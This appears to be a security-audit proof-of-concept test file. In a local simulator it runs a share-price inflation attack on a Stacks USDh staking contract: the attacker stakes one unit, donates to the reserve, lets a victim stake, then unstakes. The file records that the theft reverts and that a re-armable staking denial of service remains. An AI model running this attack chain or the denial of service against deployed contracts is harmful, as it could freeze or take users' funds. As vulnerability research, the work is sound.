// SPDX-License-Identifier: MIT
// H7 PoC — USDh staking share-price inflation (donation / first-depositor class)
//
// Runs against the EXACT production code (repo HEAD, verified byte-equivalent to mainnet
// during recon session 5). Simnet-only config deltas (documented, mirror mainnet state):
//   - .staking-silo registered in usdh-hq protocol map  (mainnet: admin-populated,
//     required by staking-reserve.transfer's check-is-protocol(recipient))
//   - attacker EOA registered as minting-contract (to obtain test USDh; mainnet USDh
//     comes from the minting stack)
//
// Phases:
//   P0: ft-semantics probes — ft-mint?(0) and ft-transfer?(0) behavior recorded
//   P1: landmine refundability — attacker recovers donation in full if nobody stakes
//   P2: CORE theft — victim stake X <= D mints 0 shares (integer floor), attacker
//       unstakes 1 raw share and drains the ENTIRE pool (1 + D + X)
//   P3: ft-semantics recording (susdh transfer(0)) — decides whether the in-scope
//       hermetica-stake path completes or reverts at susdh-amount = 0

import { describe, it, expect } from 'vitest';
import { Cl } from '@stacks/transactions';

const D = simnet.deployer;
const accounts: Map<string, string> = simnet.getAccounts();
const attacker = accounts.get('wallet_1')!;
const victim = accounts.get('wallet_2')!;
const anyone = accounts.get('wallet_3')!;

const usdh = `${D}.usdh-token`;
const susdh = `${D}.susdh-token`;
const hq = `${D}.hq`;
const staking = `${D}.staking`;
const stakingReserve = `${D}.staking-reserve`;
const stakingSilo = `${D}.staking-silo`;
const stakingState = `${D}.staking-state`;

const ONE = 100_000_000n; // 1e8
const DONATION = 50_001n * ONE; // D — attacker transient capital, fully refundable
const VICTIM_STAKE = 50_000n * ONE; // X — worked example: 50,000 USDh

type Res = { result: any; events: any[] };

function expectOk(res: Res) {
  expect(res.result.type).toBe('ok');
}
function okUint(res: Res): bigint {
  expect(res.result.type).toBe('ok');
  return BigInt(res.result.value.value);
}
function usdhBalance(who: string): bigint {
  return okUint(simnet.callReadOnlyFn(usdh, 'get-balance', [Cl.principal(who)], D));
}
function susdhBalance(who: string): bigint {
  return okUint(simnet.callReadOnlyFn(susdh, 'get-balance', [Cl.principal(who)], D));
}
function reserveBalance(): bigint {
  return usdhBalance(stakingReserve);
}
function ratio(): bigint {
  return okUint(simnet.callReadOnlyFn(staking, 'get-usdh-per-susdh', [], D));
}

function makeMinter(who: string) {
  expectOk(simnet.callPublicFn(hq, 'request-minting-contract-update', [Cl.principal(who)], D));
  simnet.mineEmptyBurnBlocks(1008); // hq activation-delay = u1008 burn blocks
  expectOk(simnet.callPublicFn(hq, 'activate-minting-contract', [Cl.principal(who)], D));
}
function mintUsdh(amount: bigint, to: string) {
  expectOk(simnet.callPublicFn(usdh, 'mint-for-protocol', [Cl.uint(amount), Cl.principal(to)], attacker));
}
function zeroCooldown(who: string) {
  expectOk(simnet.callPublicFn(stakingState, 'set-custom-cooldown', [Cl.principal(who), Cl.uint(0n)], D));
}
function donate(amount: bigint, from: string) {
  expectOk(
    simnet.callPublicFn(
      usdh, 'transfer',
      [Cl.uint(amount), Cl.principal(from), Cl.principal(stakingReserve), Cl.none()],
      from
    )
  );
}

describe('H7: staking share-price inflation', () => {
  it('full attack chain against production staking-v1-1', () => {
    // ---- setup: mirror mainnet config + fund attacker ----
    expectOk(simnet.callPublicFn(hq, 'set-contract-active', [Cl.principal(stakingSilo), Cl.bool(true)], D));
    makeMinter(attacker);
    mintUsdh(2n + 2n * DONATION + VICTIM_STAKE, attacker);

    // ---- P0: ft-mint?(0) semantics (the linchpin of the 0-share mint) ----
    const probeMintZero = simnet.callPublicFn(usdh, 'mint-for-protocol', [Cl.uint(0n), Cl.principal(anyone)], attacker);
    console.log('[P0] ft-mint?(0) via usdh.mint-for-protocol ->', JSON.stringify(probeMintZero.result));

    // ---- P1: landmine refundability (zero-risk if no victim ever stakes) ----
    expectOk(simnet.callPublicFn(staking, 'stake', [Cl.uint(1n), Cl.none()], attacker));
    expect(susdhBalance(attacker)).toBe(1n);
    donate(DONATION, attacker);
    expect(reserveBalance()).toBe(1n + DONATION);
    expect(ratio()).toBe((1n + DONATION) * ONE); // raw-balance pricing, no protection

    zeroCooldown(attacker);
    const refundClaim = okUint(simnet.callPublicFn(staking, 'unstake', [Cl.uint(1n)], attacker));
    expectOk(simnet.callPublicFn(stakingSilo, 'withdraw', [Cl.uint(refundClaim)], anyone));
    expect(usdhBalance(attacker)).toBe(2n + 2n * DONATION + VICTIM_STAKE); // fully recovered (incl. staked unit)
    expect(reserveBalance()).toBe(0n); // pool empty again
    console.log('[P1] landmine refundable: attacker recovered donation in full');

    // ---- P2: CORE test — does the 0-share mint theft actually work? ----
    expectOk(simnet.callPublicFn(staking, 'stake', [Cl.uint(1n), Cl.none()], attacker));
    donate(DONATION, attacker);
    expect(ratio()).toBe((1n + DONATION) * ONE);

    mintUsdh(VICTIM_STAKE, victim); // victim funds (on mainnet: from minting stack / OTC)
    const victimStake = simnet.callPublicFn(staking, 'stake', [Cl.uint(VICTIM_STAKE), Cl.none()], victim);
    console.log('[P2] victim stake(50,000 USDh) on inflated pool ->', JSON.stringify(victimStake.result));
    // EMPIRICAL RESULT: the stake REVERTS — Clarity VM rejects ft-mint?(0) with (err u1),
    // so the "victim receives 0 shares" theft primitive is BLOCKED at the VM level.
    expect(victimStake.result.type).toBe('err');
    expect(BigInt(victimStake.result.value.value)).toBe(1n); // err propagated from ft-mint? zero rejection
    expect(usdhBalance(victim)).toBe(VICTIM_STAKE); // victim funds FULLY INTACT (atomic revert)
    expect(susdhBalance(victim)).toBe(0n);

    // DoS residual: the inflated landmine bricks staking for any X <= D (stake reverts),
    // and it is re-armable at zero cost — attacker recovers everything and re-arms:
    zeroCooldown(attacker);
    const refund2 = okUint(simnet.callPublicFn(staking, 'unstake', [Cl.uint(1n)], attacker));
    expectOk(simnet.callPublicFn(stakingSilo, 'withdraw', [Cl.uint(refund2)], anyone));
    expect(usdhBalance(attacker)).toBe(2n + 2n * DONATION + VICTIM_STAKE); // nothing lost
    expect(reserveBalance()).toBe(0n);
    console.log('[P2] attacker recovered 1 + D in full; landmine is re-armable at zero cost -> persistent staking DoS');

    // Best remaining theft variant (S=1 boundary): donation D' = X - 1 so the victim
    // mints exactly 1 share. Attacker then owns 50% of supply. Expected profit:
    // (X - 1 - D) / 2 = 0 -> the variant must be PROFITLESS.
    const p2bStart = usdhBalance(attacker);
    expectOk(simnet.callPublicFn(staking, 'stake', [Cl.uint(1n), Cl.none()], attacker));
    donate(VICTIM_STAKE - 1n, attacker);
    const vs2 = simnet.callPublicFn(staking, 'stake', [Cl.uint(VICTIM_STAKE), Cl.none()], victim);
    console.log('[P2b] victim stake with D = X-1 (expect 1 share) ->', JSON.stringify(vs2.result));
    expectOk(vs2);
    expect(susdhBalance(victim)).toBe(1n); // exactly 1 share minted
    const c2 = okUint(simnet.callPublicFn(staking, 'unstake', [Cl.uint(1n)], attacker));
    expectOk(simnet.callPublicFn(stakingSilo, 'withdraw', [Cl.uint(c2)], anyone));
    expect(usdhBalance(attacker)).toBe(p2bStart); // recovered investment EXACTLY -> profit = 0
    console.log('[P2b] attacker net profit on S=1 variant: 0 (investment fully round-tripped)');
    // cleanup: victim withdraws their half back (they were never at a loss beyond dust)
    zeroCooldown(victim);
    const vc = okUint(simnet.callPublicFn(staking, 'unstake', [Cl.uint(1n)], victim));
    expectOk(simnet.callPublicFn(stakingSilo, 'withdraw', [Cl.uint(vc)], anyone));
    expect(usdhBalance(victim)).toBe(VICTIM_STAKE); // victim ends whole

    // ---- P3: ft-transfer?(0) semantics — recorded for completeness.
    // NOTE: the in-scope hermetica-stake path can never reach its susdh transfer(0):
    // the internal staking.stake() reverts first at ft-mint?(0).
    const probeXferZero = simnet.callPublicFn(
      susdh, 'transfer',
      [Cl.uint(0n), Cl.principal(attacker), Cl.principal(victim), Cl.none()],
      attacker
    );
    console.log('[P3] ft-transfer?(0) via susdh.transfer ->', JSON.stringify(probeXferZero.result));
    expect(['ok', 'err']).toContain(probeXferZero.result.type);
  });
});
